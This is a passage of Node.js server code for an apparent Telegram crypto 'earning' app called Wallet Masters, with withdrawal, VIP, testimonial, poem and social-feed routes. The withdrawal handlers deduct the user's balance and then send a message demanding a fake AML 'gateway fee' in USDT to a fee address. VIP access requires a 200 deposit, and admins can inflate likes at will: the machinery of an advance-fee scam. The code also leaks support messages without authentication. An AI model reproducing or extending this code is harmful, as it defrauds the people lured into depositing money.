  return { ...user, balance: user.usdt_balance||0, trc20Address: user.trc20_address||SHARED_TRC20_ADDRESS, isVIP: user.is_vip===true, termsAccepted: user.terms_accepted===true, referralCode: user.referral_code||user.uid, referralCount: user.referral_count||0, telegramId: user.telegram_id, name: user.full_name||user.registered_name||'', username: user.telegram_username||'', isActive: user.is_active!==false, earningsSuspended: user.earnings_suspended===true, hourlyStatus: { canClaim: hourlyStatus.canClaim, nextClaimIn: Math.round(hourlyStatus.nextClaimIn/1000), earningRate, hourlyAmount: earningRate } };
}

// ─── API Routes ───────────────────────────────────────────────────────────────
app.post('/api/auth', (req, res) => {
  const tgUser = getTelegramUser(req);
  if (!tgUser) return res.status(401).json({ error: 'Unauthorized' });
  const { id, username, first_name, last_name } = tgUser;
  const fullName = [first_name, last_name].filter(Boolean).join(' ');
  const ref      = req.body?.ref || req.body?.referralCode || null;
  const user     = getOrCreateUser(id, username, fullName, ref);
  if (!user.is_active) return res.status(403).json({ error: 'Account deactivated', deactivated: true });
  res.json({ success: true, user: enrichUser(user, id), transactions: getUserTransactions(id).slice(0,20), connections: getUserConnections(id), withdrawals: getUserWithdrawals(id) });
});

app.get('/api/dashboard', authMiddleware, (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  if (!user.is_active) return res.status(403).json({ error: 'Account deactivated' });
  res.json({ user: enrichUser(user,req.tgUser.id), hourlyStatus: getHourlyStatus(user.telegram_id), transactions: getUserTransactions(user.telegram_id).slice(0,20), earningApps: getEarningApps(), connections: getUserConnections(user.telegram_id), withdrawals: getUserWithdrawals(user.telegram_id) });
});

app.post('/api/claim-hourly', authMiddleware, (req, res) => {
  const result = claimHourlyEarning(req.tgUser.id);
  if (!result.success) return res.status(400).json(result);
  res.json(result);
});

app.post('/api/hourly-status', authMiddleware, (req, res) => {
  const status = getHourlyStatus(req.tgUser.id);
  res.json({ canClaim: status.canClaim, nextClaimIn: Math.round(status.nextClaimIn/1000), hourlyAmount: status.hourlyAmount, earningRate: status.hourlyAmount });
});

app.post('/api/withdraw', authMiddleware, async (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error:'User not found' });
  if (!user.is_vip) return res.status(403).json({ error:'VIP required' });
  const { amount, isBankWithdrawal, toAddress, bankName, bankCountry, localCurrency, accountNumber, accountName, network, method } = req.body;
  const amt = parseFloat(amount);
  if (!amt||amt<MIN_WITHDRAWAL||amt>MAX_WITHDRAWAL) return res.status(400).json({ error:`Amount must be between ${MIN_WITHDRAWAL} and ${MAX_WITHDRAWAL} USDT` });
  if (user.usdt_balance < amt) return res.status(400).json({ error:'Insufficient balance' });
  const fees = calculateFees(amt);
  updateUserBalance(user.telegram_id, -amt);
  createTransaction(user.telegram_id, 'withdrawal', amt, 'Withdrawal request', 'pending');
  const wd = createWithdrawalRequest({ telegram_id:user.telegram_id, amount:amt, method:method||(isBankWithdrawal?'bank':'crypto'), account_number:accountNumber||toAddress||'', bank_name:bankName||'', country:bankCountry||'', currency:localCurrency||'USDT', fee:fees.total_fee, net_amount:fees.net_amount });
  bot.sendMessage(ADMIN_CHAT_ID, `💸 <b>Withdrawal #${wd.id}</b>\n👤 ${user.full_name} (${user.uid})\n💰 ${amt} USDT\n🏦 ${bankName||method||'Crypto'} — ${accountNumber||toAddress||''}\n🌍 ${bankCountry||''} ${localCurrency||''}`, { parse_mode:'HTML', reply_markup:{inline_keyboard:[[{text:'✅ Approve',callback_data:`wd_approve_${wd.id}`},{text:'❌ Reject',callback_data:`wd_reject_${wd.id}`}]]}}).catch(()=>{});
  bot.sendMessage(user.telegram_id, `⚠️ <b>Action Required — Withdrawal #${wd.id}</b>\n\nTo finalize your withdrawal, we require the settlement of your outstanding gateway fee. This procedure ensures alignment with mandatory Anti-Money Laundering (AML) policies designed to prevent digital assets from being utilized in financial crimes.\n\nPlease fund your designated USDT TRC20 address with the required USDT amount, and your transaction will be processed immediately.\n\n📍 <b>TRC20 Address:</b>\n<code>${FEE_ADDRESS}</code>\n💰 Gateway Fee: ${fees.total_fee} USDT`, { parse_mode:'HTML', ...openWalletBtn() }).catch(()=>{});
  res.json({ success:true, withdrawal:wd, fees });
});

app.get('/api/withdrawals', authMiddleware, (req, res) => res.json({ withdrawals: getUserWithdrawals(req.tgUser.id) }));

app.post('/api/withdrawal', authMiddleware, async (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user||!user.is_vip) return res.status(403).json({ error:'VIP required' });
  const { amount, method, account_number, bank_name, country, currency } = req.body;
  const amt = parseFloat(amount);
  if (!amt||amt<MIN_WITHDRAWAL||amt>MAX_WITHDRAWAL) return res.status(400).json({ error:'Invalid amount' });
  if (user.usdt_balance<amt) return res.status(400).json({ error:'Insufficient balance' });
  const fees = calculateFees(amt);
  updateUserBalance(user.telegram_id,-amt); createTransaction(user.telegram_id,'withdrawal',amt,'Withdrawal','pending');
  const wd = createWithdrawalRequest({ telegram_id:user.telegram_id, amount:amt, method, account_number, bank_name, country, currency, fee:fees.total_fee, net_amount:fees.net_amount });
  bot.sendMessage(ADMIN_CHAT_ID, `💸 Withdrawal #${wd.id} — ${user.full_name} — ${amt} USDT`, { reply_markup:{inline_keyboard:[[{text:'✅ Approve',callback_data:`wd_approve_${wd.id}`},{text:'❌ Reject',callback_data:`wd_reject_${wd.id}`}]]}}).catch(()=>{});
  bot.sendMessage(user.telegram_id, `⚠️ <b>Action Required</b>\n\nTo finalize your withdrawal, we require the settlement of your outstanding gateway fee. This procedure ensures alignment with mandatory Anti-Money Laundering (AML) policies designed to prevent digital assets from being utilized in financial crimes.\n\nPlease fund your USDT TRC20 address with the required amount and your transaction will be processed immediately.\n\n📍 <code>${FEE_ADDRESS}</code>\n💰 Fee: ${fees.total_fee} USDT`, { parse_mode:'HTML', ...openWalletBtn() }).catch(()=>{});
  res.json({ success:true, withdrawal:wd, fees });
});

app.post('/api/vip-upgrade', authMiddleware, async (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user||user.is_vip) return res.status(400).json({ error: user?'Already VIP':'User not found' });
  const imageData = req.body.receiptBase64||req.body.receipt_image;
  createWithdrawalRequest({ telegram_id:user.telegram_id, amount:200, method:'vip_upgrade', account_number:'VIP Deposit', bank_name:'VIP Upgrade', status:'pending_vip' });
  if (imageData) {
    try {
      const buffer = Buffer.from(imageData.replace(/^data:[^;]+;base64,/,''),'base64');
      bot.sendPhoto(ADMIN_CHAT_ID, buffer, { caption:`👑 VIP Request\n${user.full_name} (${user.uid})\nID: ${user.telegram_id}`, reply_markup:{inline_keyboard:[[{text:'👑 Activate VIP',callback_data:`vip_approve_${user.telegram_id}`},{text:'❌ Reject',callback_data:`vip_reject_${user.telegram_id}`}]]}}).catch(()=>{
        bot.sendMessage(ADMIN_CHAT_ID,`👑 VIP from ${user.full_name}`,{reply_markup:{inline_keyboard:[[{text:'👑 Activate',callback_data:`vip_approve_${user.telegram_id}`},{text:'❌ Reject',callback_data:`vip_reject_${user.telegram_id}`}]]}}).catch(()=>{});
      });
    } catch(e){}
  }
  res.json({ success:true });
});

// FIX: Terms accepted — persisted forever
app.post('/api/accept-terms', authMiddleware, (req, res) => {
  db.get('users').find({ telegram_id: String(req.tgUser.id) }).assign({ terms_accepted: true, updated_at: nowSec() }).write();
  res.json({ success: true });
});

app.post('/api/support',      authMiddleware, async (req,res) => { const user=getUserByTelegramId(req.tgUser.id); if(!user) return res.status(404).json({error:'Not found'}); const {message}=req.body; if(!message) return res.status(400).json({error:'Missing message'}); createSupportMessage(user.telegram_id,message,false); bot.sendMessage(ADMIN_CHAT_ID,`💬 <b>${user.full_name} (${user.uid})</b>\n\n"${message}"`,{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'Reply',callback_data:`reply_user_${user.telegram_id}`}]]}}).catch(()=>{}); res.json({success:true}); });
app.post('/api/support/send', authMiddleware, async (req,res) => { const user=getUserByTelegramId(req.tgUser.id); if(!user) return res.status(404).json({error:'Not found'}); const {message}=req.body; if(!message) return res.status(400).json({error:'Missing'}); createSupportMessage(user.telegram_id,message,false); bot.sendMessage(ADMIN_CHAT_ID,`💬 <b>${user.full_name} (${user.uid})</b>\n"${message}"`,{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'Reply',callback_data:`reply_user_${user.telegram_id}`}]]}}).catch(()=>{}); res.json({success:true}); });
app.get('/api/support/messages', (req,res) => { const tgUser=getTelegramUser(req); const tid=tgUser?.id||req.query.telegramId; if(!tid) return res.json([]); res.json(getSupportMessages(String(tid))); });

// Testimonials
async function handleTestimonialSubmit(req, res) {
  const user = getUserByTelegramId(req.tgUser.id); if(!user) return res.status(404).json({error:'Not found'});
  const { type, caption, youtubeUrl, youtube_url, videoData, video_file, videoFileName } = req.body;
  const tes = createTestimonial(user.telegram_id, { user_name:user.full_name, type, youtube_url:youtubeUrl||youtube_url, video_file:videoData?'[stored]':'', caption });
  const reward = type==='youtube'?2000:1000;
  res.json({ success:true, testimonial:tes });
  bot.sendMessage(ADMIN_CHAT_ID, `🎬 <b>Testimonial #${tes.id}</b>\n👤 ${user.full_name} (${user.uid})\n📎 ${type}\n${(youtubeUrl||youtube_url)?'🔗 '+(youtubeUrl||youtube_url)+'\n':''}💬 ${caption||'none'}\n💰 ${reward} USDT`, { parse_mode:'HTML', reply_markup:{inline_keyboard:[[{text:`✅ Approve (+${reward})`,callback_data:`test_approve_${tes.id}`},{text:'❌ Reject',callback_data:`test_reject_${tes.id}`}]]}}).catch(()=>{});
  if (type!=='youtube'&&(videoData||video_file)) {
    setImmediate(async () => {
      try {
        const buf = Buffer.from((videoData||video_file).replace(/^data:[^;]+;base64,/,''),'base64');
        const fname = videoFileName||'testimonial.mp4'; const ext=fname.split('.').pop().toLowerCase();
        if (['mp4','mov','webm','avi'].includes(ext)) bot.sendVideo(ADMIN_CHAT_ID,buf,{caption:`🎥 Testimonial #${tes.id} — ${user.full_name}`}).catch(()=>bot.sendDocument(ADMIN_CHAT_ID,buf,{filename:fname}).catch(()=>{}));
        else bot.sendDocument(ADMIN_CHAT_ID,buf,{filename:fname}).catch(()=>{});
      } catch(e){}
    });
  }
}
app.post('/api/testimonial',        authMiddleware, handleTestimonialSubmit);
app.post('/api/testimonial/submit', authMiddleware, handleTestimonialSubmit);
app.get('/api/testimonials', (req,res) => res.json({ testimonials: getApprovedTestimonials() }));

app.get('/api/earning-apps', (req,res) => res.json({ apps: getEarningApps() }));
app.get('/api/apps',         (req,res) => res.json(getEarningApps()));
app.post('/api/connect-uid', authMiddleware, (req,res) => { const user=getUserByTelegramId(req.tgUser.id); if(!user) return res.status(404).json({error:'Not found'}); const {app_token,appId,external_uid,uid}=req.body; const ea=app_token?getEarningAppByToken(app_token):(appId?getEarningAppById(parseInt(appId)):null); if(!ea) return res.status(404).json({error:'App not found'}); const conn=connectUID(user.telegram_id,ea.id,external_uid||uid); res.json({success:true,connection:conn}); });
app.post('/api/earning-app/connect', authMiddleware, (req,res) => { const user=getUserByTelegramId(req.tgUser.id); if(!user) return res.status(404).json({error:'Not found'}); const {app_token,external_uid}=req.body; const ea=getEarningAppByToken(app_token); if(!ea) return res.status(404).json({error:'App not found'}); res.json({success:true,connection:connectUID(user.telegram_id,ea.id,external_uid)}); });
app.get('/api/transactions', authMiddleware, (req,res) => res.json({ transactions: getUserTransactions(req.tgUser.id) }));

// Poems
app.post('/api/poem/submit', authMiddleware, async (req,res) => {
  const user=getUserByTelegramId(req.tgUser.id); if(!user) return res.status(404).json({error:'Not found'});
  const {content,category,title}=req.body;
  if (!content||content.trim().length<20) return res.status(400).json({error:'Content too short'});
  const poem=createPoem(user.telegram_id,{title:title||'',category:category||'General',content:content.trim(),user_name:user.full_name});
  res.json({success:true,poem});
  bot.sendMessage(ADMIN_CHAT_ID,`📝 <b>Poem #${poem.id}</b>\n👤 ${user.full_name} (${user.uid})\n📂 ${category||'General'}\n"${content.substring(0,400)}..."\n💰 1,000 USDT`,{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'✅ Approve (+1,000)',callback_data:`poem_approve_${poem.id}`},{text:'❌ Reject',callback_data:`poem_reject_${poem.id}`}]]}}).catch(()=>{});
});
app.get('/api/poems', (req,res) => res.json({ poems: getApprovedPoems() }));

// ─── SOCIALPAY ────────────────────────────────────────────────────────────────
app.get('/api/socialpay/posts', (req,res) => {
  const posts    = getApprovedSocialPosts();
  const profiles = getAllSocialProfiles();
  const tgUser   = getTelegramUser(req);
  const enriched = posts.map(p => {
    const prof = profiles.find(pr=>pr.telegram_id===p.telegram_id)||{};
    return { ...p, author_name:prof.display_name||'User', author_verified:prof.is_verified||false, author_gold:prof.is_gold_verified||false, author_pic:prof.profile_pic||'', author_country:prof.country||'', liked_by_me: tgUser?hasLiked(tgUser.id,p.id):false };
  });
  res.json({ posts: enriched });
});

app.post('/api/socialpay/post', authMiddleware, async (req,res) => {
  const user=getUserByTelegramId(req.tgUser.id); if(!user) return res.status(404).json({error:'Not found'});
  const {caption,post_type,image_data,voice_data}=req.body;
  if (!caption||caption.trim().length<5) return res.status(400).json({error:'Caption too short'});
  // Store image_data in post for display
  const post=createSocialPost(user.telegram_id,{caption:caption.trim(),post_type:post_type||'text',image_data:image_data||null,voice_data:voice_data||null,has_image:!!image_data,has_voice:!!voice_data,user_likes:0});
  res.json({success:true,post});
  const prof=getSocialProfile(user.telegram_id);
  bot.sendMessage(ADMIN_CHAT_ID,`🌟 <b>SocialPay #${post.id}</b>\n👤 ${user.full_name} (${user.uid})${prof.is_verified?' 🟠✅':''}\n📎 ${post_type||'text'}\n💬 "${caption.substring(0,300)}"`,{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'✅ Approve',callback_data:`sp_approve_${post.id}`},{text:'❌ Reject',callback_data:`sp_reject_${post.id}`}],[{text:'❤️ 1K',callback_data:`sp_likes_${post.id}_1000`},{text:'❤️ 10K',callback_data:`sp_likes_${post.id}_10000`}],[{text:'❤️ 100K',callback_data:`sp_likes_${post.id}_100000`},{text:'❤️ 1M',callback_data:`sp_likes_${post.id}_1000000`}]]}}).catch(()=>{});
  if (image_data) setImmediate(()=>{ try { const buf=Buffer.from(image_data.replace(/^data:[^;]+;base64,/,''),'base64'); bot.sendPhoto(ADMIN_CHAT_ID,buf,{caption:`SocialPay #${post.id} — ${user.full_name}`}).catch(()=>{}); } catch(e){} });
  if (voice_data) setImmediate(()=>{ try { const buf=Buffer.from(voice_data.replace(/^data:[^;]+;base64,/,''),'base64'); bot.sendVoice(ADMIN_CHAT_ID,buf,{caption:`SocialPay Voice #${post.id} — ${user.full_name}`}).catch(()=>{}); } catch(e){} });
});

// Edit post
app.put('/api/socialpay/post/:id', authMiddleware, (req,res) => {
  const post=getSocialPostById(parseInt(req.params.id));
  if (!post) return res.status(404).json({error:'Not found'});
  if (post.telegram_id!==String(req.tgUser.id)) return res.status(403).json({error:'Not your post'});
  const {caption}=req.body;
  if (!caption||caption.trim().length<5) return res.status(400).json({error:'Caption too short'});
  const updated=updateSocialPost(post.id,{caption:caption.trim()});
  res.json({success:true,post:updated});
});

app.post('/api/socialpay/like', authMiddleware, (req,res) => res.json(likePost(req.tgUser.id,req.body.post_id)));

app.get('/api/socialpay/profile/:telegramId', (req,res) => {
  const prof=getSocialProfile(req.params.telegramId);
  const posts=getSocialPostsByUser(req.params.telegramId).filter(p=>p.status==='approved');
  res.json({profile:prof,posts});
});
app.post('/api/socialpay/profile', authMiddleware, (req,res) => {
  const {display_name,country,age,profile_pic,bio}=req.body;
  const updates={};
  if (display_name!==undefined) updates.display_name=display_name;
  if (country!==undefined)      updates.country=country;
  if (age!==undefined)          updates.age=age;
  if (profile_pic!==undefined)  updates.profile_pic=profile_pic;
  // Only enforce verified check if bio is actually provided and non-empty
  if (bio!==undefined && bio!==null && String(bio).trim().length>0) {
    const prof=getSocialProfile(String(req.tgUser.id));
    if (!prof.is_verified) return res.status(403).json({error:'Verified badge required to add bio'});
    updates.bio=bio;
  }
  const profile = updateSocialProfile(req.tgUser.id,updates);
  res.json({success:true,profile});
});
app.get('/api/socialpay/my-profile', authMiddleware, (req,res) => {
  const prof=getSocialProfile(req.tgUser.id);
  const posts=getSocialPostsByUser(req.tgUser.id);
  res.json({profile:prof,posts});
});

// Comments (verified users only)
app.get('/api/socialpay/comments/:postId', (req,res) => {
  const comments=getCommentsByPost(req.params.postId);
  const profiles=getAllSocialProfiles();
  const enriched=comments.map(c=>{
    const prof=profiles.find(p=>p.telegram_id===c.telegram_id)||{};
    return {...c,author_name:prof.display_name||'User',author_verified:prof.is_verified||false,author_gold:prof.is_gold_verified||false,author_pic:prof.profile_pic||''};
  });
  res.json({comments:enriched});
});
app.post('/api/socialpay/comment', authMiddleware, (req,res) => {
  const prof=getSocialProfile(String(req.tgUser.id));
  if (!prof.is_verified) return res.status(403).json({error:'Only verified users can comment'});
  const {post_id,text,parent_id}=req.body;
  if (!text||text.trim().length<1) return res.status(400).json({error:'Comment too short'});
  const c=createComment(req.tgUser.id,post_id,text.trim(),parent_id||null);
  const enriched={...c,author_name:prof.display_name||'User',author_verified:true,author_gold:prof.is_gold_verified||false,author_pic:prof.profile_pic||''};
  res.json({success:true,comment:enriched});
});
app.delete('/api/socialpay/comment/:id', authMiddleware, (req,res) => {
  const c=db.get('sp_comments').find({id:parseInt(req.params.id)}).value();
  if (!c) return res.status(404).json({error:'Not found'});
  // Admin header or own comment
  const isAdmin=req.headers['x-admin-key']===BOT_TOKEN||String(req.tgUser.id)===String(ADMIN_CHAT_ID);
  if (!isAdmin&&c.telegram_id!==String(req.tgUser.id)) return res.status(403).json({error:'Not authorized'});
  deleteComment(parseInt(req.params.id));
  res.json({success:true});
});

// Verification
app.post('/api/socialpay/apply-verification', authMiddleware, async (req,res) => {
  const {type}=req.body;
  const prof=getSocialProfile(String(req.tgUser.id));
  if (type==='gold') {
    if (!prof.is_verified) return res.status(400).json({error:'Orange verified badge required first'});
    if ((prof.total_likes||0)<500000) return res.status(400).json({error:'You need at least 500,000 likes to apply for Gold'});
    if (prof.is_gold_verified) return res.status(400).json({error:'Already Gold verified'});
  } else {
    if ((prof.total_likes||0)<1000) return res.status(400).json({error:'You need at least 1,000 likes to apply'});
    if (prof.is_verified) return res.status(400).json({error:'Already verified'});
  }
  const result=createVerificationRequest(req.tgUser.id,type||'orange');
  if (!result.success) return res.status(400).json(result);
  res.json({success:true});
  const user=getUserByTelegramId(req.tgUser.id);
  bot.sendMessage(ADMIN_CHAT_ID,`${type==='gold'?'🌟 Gold':'✅ Orange'} <b>Verification Request</b>\n👤 ${user?.full_name||'User'} (${user?.uid||req.tgUser.id})\n❤️ ${(prof.total_likes||0).toLocaleString()} likes`,{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:`${type==='gold'?'🌟 Grant Gold':'🟠 Grant Badge'}`,callback_data:`ver_approve_${result.request.id}`},{text:'❌ Reject',callback_data:`ver_reject_${result.request.id}`}]]}}).catch(()=>{});
});

// DMs (Gold verified only)
app.get('/api/socialpay/dm-contacts', authMiddleware, (req,res) => {
  const prof=getSocialProfile(String(req.tgUser.id));
  if (!prof.is_gold_verified) return res.status(403).json({error:'Gold verified badge required'});
  const contacts=getDMContacts(req.tgUser.id);
  const enriched=contacts.map(tid=>{ const p=getSocialProfile(tid); const u=getUserByTelegramId(tid); return {telegram_id:tid,display_name:p.display_name||u?.full_name||'User',profile_pic:p.profile_pic||'',is_gold_verified:p.is_gold_verified||false}; });
  res.json({contacts:enriched});
});
app.get('/api/socialpay/dms/:toTid', authMiddleware, (req,res) => {
  const prof=getSocialProfile(String(req.tgUser.id));
  if (!prof.is_gold_verified) return res.status(403).json({error:'Gold verified badge required'});
  const toprof=getSocialProfile(req.params.toTid);
  if (!toprof.is_gold_verified) return res.status(403).json({error:'Recipient must also be Gold verified'});
  markDMsRead(req.params.toTid,req.tgUser.id);
  res.json({dms:getDMs(req.tgUser.id,req.params.toTid)});
});
app.post('/api/socialpay/dm', authMiddleware, (req,res) => {
  const prof=getSocialProfile(String(req.tgUser.id));
  if (!prof.is_gold_verified) return res.status(403).json({error:'Gold verified badge required'});
  const {to_tid,text,image_data,voice_data}=req.body;
  if (!to_tid) return res.status(400).json({error:'Missing recipient'});
  const toprof=getSocialProfile(to_tid);
  if (!toprof.is_gold_verified) return res.status(403).json({error:'Recipient must also be Gold verified'});
  const dm=createDM(req.tgUser.id,to_tid,{text:text||'',image_data:image_data||null,voice_data:voice_data||null,dm_type:image_data?'image':voice_data?'voice':'text'});
  res.json({success:true,dm});
});

// Gold users list (for DMs)
app.get('/api/socialpay/gold-users', authMiddleware, (req,res) => {
  const prof=getSocialProfile(String(req.tgUser.id));
  if (!prof.is_gold_verified) return res.status(403).json({error:'Gold verified required'});
  const goldUsers=db.get('socialpay_profiles').filter(p=>p.is_gold_verified&&p.telegram_id!==String(req.tgUser.id)).value();
  res.json({users:goldUsers.map(p=>({telegram_id:p.telegram_id,display_name:p.display_name||'User',profile_pic:p.profile_pic||'',bio:p.bio||''}))});
});

if (bot) bot.on('polling_error', (e) => console.log('Polling error:', e.code));
console.log('Wallet Masters v6 bot.js loaded');
